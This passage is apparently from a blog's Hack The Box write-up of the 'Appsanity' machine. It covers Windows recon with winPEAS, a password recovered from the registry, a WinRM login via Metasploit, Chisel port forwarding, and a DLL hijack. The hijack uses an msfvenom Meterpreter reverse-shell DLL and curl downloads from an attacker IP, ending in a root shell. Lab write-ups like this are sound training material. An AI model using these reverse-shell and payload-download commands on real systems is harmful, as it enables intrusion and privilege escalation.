+<figure><img src="../assets/images/htb/appsanity/08-untitled-7.png" alt=""></figure>
+
+<p>Found Flag → <mark class="highlight-teal" data-notion-highlight="teal"><strong>629d014142e975558368678c9213d08c</strong></mark></p>
+
+<h2>svc_exampanel</h2>
+
+<h3>Recon</h3>
+
+<details>
+<summary>net user</summary>
+<div class="inner">
+<pre><code>User accounts for \\APPSANITY
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           devdoc
+Guest                    svc_exampanel            svc_meddigi
+svc_meddigiportal        WDAGUtilityAccount</code></pre>
+</div>
+</details>
+
+<h3>winpeas</h3>
+
+<details>
+<summary>OS information</summary>
+<div class="inner">
+<pre><code>Hostname: Appsanity
+ProductName: Windows 10 Pro
+EditionID: Professional
+ReleaseId: 2009
+BuildBranch: vb_release
+CurrentMajorVersionNumber: 10
+CurrentVersion: 6.3
+Architecture: AMD64
+ProcessorCount: 2
+SystemLang: en-US
+KeyboardLang: English (United States)
+TimeZone: (UTC-08:00) Pacific Time (US &amp; Canada)
+IsVirtualMachine: True
+Current Time: 11/2/2023 6:22:58 AM
+HighIntegrity: False
+PartOfDomain: False
+Hotfixes:
+
+OS Build Number: 19045
+Windows version not supported</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Environment variables</summary>
+<div class="inner">
+<pre><code>COMPUTERNAME: APPSANITY
+PUBLIC: C:\Users\Public
+LOCALAPPDATA: C:\Windows\system32\config\systemprofile\AppData\Local
+PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PROCESSOR_ARCHITECTURE: AMD64
+Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\dotnet\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
+ProgramFiles(x86): C:\Program Files (x86)
+PROCESSOR_LEVEL: 23
+ProgramFiles: C:\Program Files
+USERPROFILE: C:\Windows\system32\config\systemprofile
+SystemRoot: C:\Windows
+OS: Windows_NT
+APP_POOL_ID: ExamPanel
+ALLUSERSPROFILE: C:\ProgramData
+DriverData: C:\Windows\System32\Drivers\DriverData
+APP_POOL_CONFIG: C:\inetpub\temp\apppools\ExamPanel\ExamPanel.config
+PROCESSOR_REVISION: 3100
+USERNAME: APPSANITY$
+NoWriteWithoutFail: 1
+CommonProgramFiles: C:\Program Files\Common Files
+PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
+ComSpec: C:\Windows\system32\cmd.exe
+PROMPT: $P$G
+SystemDrive: C:
+TEMP: C:\Windows\TEMP
+ProgramData: C:\ProgramData
+NUMBER_OF_PROCESSORS: 2
+APPDATA: C:\Windows\system32\config\systemprofile\AppData\Roaming
+TMP: C:\Windows\TEMP
+CommonProgramW6432: C:\Program Files\Common Files
+ProgramW6432: C:\Program Files
+windir: C:\Windows
+USERDOMAIN: WORKGROUP</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Current Token privileges</summary>
+<div class="inner">
+<pre><code>SeIncreaseQuotaPrivilege: DISABLED
+SeShutdownPrivilege: DISABLED
+SeAuditPrivilege: DISABLED
+SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeUndockPrivilege: DISABLED
+SeIncreaseWorkingSetPrivilege: DISABLED
+eTimeZonePrivilege: DISABLED</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Home folders</summary>
+<div class="inner">
+<pre><code>C:\Users\Administrator
+C:\Users\All Users
+C:\Users\Default
+C:\Users\Default User
+C:\Users\devdoc
+C:\Users\Public : Batch [WriteData/CreateFiles]
+C:\Users\svc_exampanel : svc_exampanel [AllAccess]
+C:\Users\svc_meddigi
+C:\Users\svc_meddigiportal</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Listening Ports</summary>
+<div class="inner">
+<pre><code>Proto     Local Address          Foreign Address        State
+TCP       0.0.0.0:80                                    Listening
+TCP       0.0.0.0:100                                   Listening
+TCP       0.0.0.0:135                                   Listening
+TCP       0.0.0.0:443                                   Listening
+TCP       0.0.0.0:445                                   Listening
+TCP       0.0.0.0:5040                                  Listening
+TCP       0.0.0.0:5985                                  Listening
+TCP       0.0.0.0:8080                                  Listening
+TCP       0.0.0.0:47001                                 Listening
+TCP       0.0.0.0:49664                                 Listening
+TCP       0.0.0.0:49665                                 Listening
+TCP       0.0.0.0:49666                                 Listening
+TCP       0.0.0.0:49667                                 Listening
+TCP       0.0.0.0:49668                                 Listening
+TCP       10.10.11.238:139                              Listening
+TCP       [::]:80                                       Listening
+TCP       [::]:135                                      Listening
+TCP       [::]:443                                      Listening
+TCP       [::]:445                                      Listening
+TCP       [::]:5985                                     Listening
+TCP       [::]:8080                                     Listening
+TCP       [::]:47001                                    Listening
+TCP       [::]:49664                                    Listening
+TCP       [::]:49665                                    Listening
+TCP       [::]:49666                                    Listening
+TCP       [::]:49667                                    Listening
+TCP       [::]:49668                                    Listening
+UDP       0.0.0.0:123                                   Listening
+UDP       0.0.0.0:5050                                  Listening
+UDP       0.0.0.0:5353                                  Listening
+UDP       0.0.0.0:5355                                  Listening
+UDP       10.10.11.238:137                              Listening
+UDP       10.10.11.238:138                              Listening
+UDP       10.10.11.238:1900                             Listening
+UDP       10.10.11.238:63256                            Listening
+UDP       127.0.0.1:1900                                Listening
+UDP       127.0.0.1:62850                               Listening
+UDP       127.0.0.1:63257                               Listening
+UDP       [::]:123                                      Listening
+UDP       [::1]:1900                                    Listening
+UDP       [::1]:63255                                   Listening</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Firewall</summary>
+<div class="inner">
+<pre><code>Current Profiles: PUBLIC
+FirewallEnabled (Domain):    True
+FirewallEnabled (Private):    True
+FirewallEnabled (Public):    True
+DENY rules:
+(2147483647)Block 135[]: DENY TCP OUT from *:135 --&gt; *:*</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Processes information (the webapp)</summary>
+<div class="inner">
+<pre><code>conhost(2072)[C:\Windows\system32\conhost.exe] -- POwn: svc_exampanel
+Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+=================================================================================================
+
+wp(1280)[c:\Users\svc_exampanel\Documents\wp.exe] -- POwn: svc_exampanel -- isDotNet
+Permissions: svc_exampanel [AllAccess]
+Possible DLL Hijacking folder: c:\Users\svc_exampanel\Documents (svc_exampanel [AllAccess])
+Command Line: .\wp.exe
+=================================================================================================
+
+cmd(2664)[C:\Windows\system32\cmd.exe] -- POwn: svc_exampanel
+Command Line: "C:\Windows\system32\cmd.exe"
+=================================================================================================
+
+w3wp(5736)[c:\windows\system32\inetsrv\w3wp.exe] -- POwn: svc_exampanel
+Command Line: c:\windows\system32\inetsrv\w3wp.exe -ap "ExamPanel" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm7a6d7593-fec2-4f0a-b56d-263c368e82f8 -h "C:\inetpub\temp\apppools\ExamPanel\ExamPanel.config" -w "" -m 0 -t 20 -ta 0
+=================================================================================================</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Interesting paths</summary>
+<div class="inner">
+<pre><code>C:\inetpub.      # IIS WebApps are hosted here</code></pre>
+</div>
+</details>
+
+<p>Reversing ExaminationManagement.dll</p>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="bb459183-24c7-4d14-ae2e-0c34e500d5d5" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%">Got a tip from someone to reverse this dll file. I found it in C:\inetpub\ExaminationPanel\ExaminationPanel\bin</div></aside>
+
+<p><a href="https://github.com/dnSpy/dnSpy" target="_blank" rel="noopener noreferrer">https://github.com/dnSpy/dnSpy</a></p>
+
+<ol><li>Found interesting function</li></ol>
+
+<pre data-lang="csharp"><code>// ExaminationPanel.index
+// Token: 0x06000017 RID: 23 RVA: 0x00002234 File Offset: 0x00000434
+private string RetrieveEncryptionKeyFromRegistry()
+{
+	string result;
+	try
+	{
+		using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\MedDigi"))
+		{
+			if (registryKey == null)
+			{
+				ErrorLogger.LogError("Registry Key Not Found");
+				base.Response.Redirect("Error.aspx?message=error+occurred");
+				result = null;
+			}
+			else
+			{
+				object value = registryKey.GetValue("EncKey");
+				if (value == null)
+				{
+					ErrorLogger.LogError("Encryption Key Not Found in Registry");
+					base.Response.Redirect("Error.aspx?message=error+occurred");
+					result = null;
+				}
+				else
+				{
+					result = value.ToString();
+				}
+			}
+		}
+	}
+	catch (Exception ex)
+	{
+		ErrorLogger.LogError("Error Retrieving Encryption Key", ex);
+		base.Response.Redirect("Error.aspx?message=error+occurred");
+		result = null;
+	}
+	return result;</code></pre>
+
+<ul><li>We can see it stores the ‘encryption key’ in the registry in local machine <code>Software\\MedDigi</code></li><li>Try to check that value in the registry
+
+<pre><code>REG QUERY HKEY_LOCAL_MACHINE\Software\MedDigi
+
+HKEY_LOCAL_MACHINE\Software\MedDigi
+    EncKey    REG_SZ    1g0tTh3R3m3dy!!</code></pre>
+
+<ul><li>We got a password! <mark class="highlight-red" data-notion-highlight="red">1g0tTh3R3m3dy!!</mark></li></ul>
+
+</li><li>Check if we can login (using metasploit)</li></ul>
+
+<pre><code>use scanner/winrm/winrm_login
+set USER_FILE /home/parallels/Desktop/users
+set PASSWORD 1g0tTh3R3m3dy!!
+set rhosts 10.10.11.238
+run
+
+[+] 10.10.11.238:5985 - Login Successful: WORKSTATION\devdoc:1g0tTh3R3m3dy!!</code></pre>
+
+<p>→ devdoc:<mark class="highlight-red" data-notion-highlight="red">1g0tTh3R3m3dy!!</mark></p>
+
+<figure><img src="../assets/images/htb/appsanity/09-untitled-8.png" alt=""></figure>
+
+<h2>Devdoc to root</h2>
+
+<h3>winpeas</h3>
+
+<details>
+<summary>Token privileges</summary>
+<div class="inner">
+<pre><code>SeShutdownPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeUndockPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeTimeZonePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Folder access</summary>
+<div class="inner">
+<pre><code>Folder: C:\Users\devdoc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+FolderPerms: devdoc [AllAccess]
+File: C:\Users\devdoc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
+FilePerms: devdoc [AllAccess]</code></pre>
+</div>
+</details>
+
+<details>
+<summary>DPAPI</summary>
+<div class="inner">
+<pre><code>[+] Checking for DPAPI Master Keys
+[?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+MasterKey: C:\Users\devdoc\AppData\Roaming\Microsoft\Protect\S-1-5-21-4111732528-4035850170-1619654654-1002\3fb93b8b-8331-4b67-8aae-82d5e09dbcc0
+Accessed: 9/26/2023 10:28:19 AM
+Modified: 9/24/2023 11:15:30 AM
+=================================================================================================
+
+
+[+] Checking for DPAPI Credential Files
+[?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+CredFile: C:\Users\devdoc\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
+Description: Local Credential Data
+
+MasterKey: 3fb93b8b-8331-4b67-8aae-82d5e09dbcc0
+Accessed: 9/26/2023 10:25:46 AM
+Modified: 9/26/2023 6:24:39 AM
+Size: 11104</code></pre>
+</div>
+</details>
+
+<h3>Forwarding ports</h3>
+
+<ol><li>Upload Chisel<pre><code>curl.exe http://10.10.16.6:88/chisel.exe -o chisel.exe</code></pre></li><li>Reverse portforwarding some ports
+
+<pre><code># On Kali (listen)
+./chisel server -p 9999 --reverse
+
+# on target (portfwd)
+.\chisel.exe client 10.10.16.6:9999 R:100:10.10.11.238:100</code></pre>
+
+</li><li>netcat</li></ol>
+
+<pre><code>┌──(parallels㉿kali)-[~]
+└─$ nc 127.0.0.1 100
+Reports Management administrative console. Type "help" to view available commands.
+help
+Available Commands:
+backup: Perform a backup operation.
+validate: Validates if any report has been altered since the last backup.
+recover &lt;filename&gt;: Restores a specified file from the backup to the Reports folder.
+upload &lt;external source&gt;: Uploads the reports to the specified external source.</code></pre>
+
+<h3>DLL Hijack</h3>
+
+<ol><li>Found interesting path <code>C:\Program Files\ReportManagement</code> . It contains a binary file <code>ReportManagement.exe</code></li>
+<li>Check exeinfo → C++<figure><img src="../assets/images/htb/appsanity/10-untitled-9.png" alt=""></figure></li>
+<li>Check bintext (strings)<pre><code># Path for library files?
+000000012200   00000001218D    0   C:\Program Files\ReportManagement\Libraries
+
+# Where the backups are stored?
+000000011F88   000000011F15      0   C:\Users\Administrator\Backup
+000000012238   0000000121C5      0   externalupload
+
+# More logs:
+000000012A60   0000000129ED      0   C:\Logs</code></pre></li>
+<li>IDA<figure><img src="../assets/images/htb/appsanity/11-untitled-10.png" alt=""></figure><blockquote>from online, someone who can properly reverse this:</blockquote><figure><img src="../assets/images/htb/appsanity/12-untitled-11.png" alt=""></figure><figure><img src="../assets/images/htb/appsanity/13-untitled-12.png" alt=""></figure><ol><li>Check our rights over this file: <figure><img src="../assets/images/htb/appsanity/14-untitled-13.png" alt=""></figure><p>→ we can rewrite this file as devdoc</p></li><li>Generate reverse shell<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f dll -o externalupload.dll</code></pre></li><li>upload &amp; execute on target<pre><code>curl http://10.10.16.6:88/nc64.exe -o nc.exe
+curl http://10.10.16.6:88/externalupload.dll -o "C:\Program Files\ReportManagement\Libraries\externalupload.dll"
+echo "upload pwn"|.\nc.exe 127.0.0.1 100</code></pre></li><li>Reverse shell callback!</li></ol><figure><img src="../assets/images/htb/appsanity/15-untitled-14.png" alt=""></figure><p>Found root flag → <mark class="highlight-teal" data-notion-highlight="teal"><strong>b597de75de7984d255c3062a67426c87</strong></mark></p></li></ol>
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
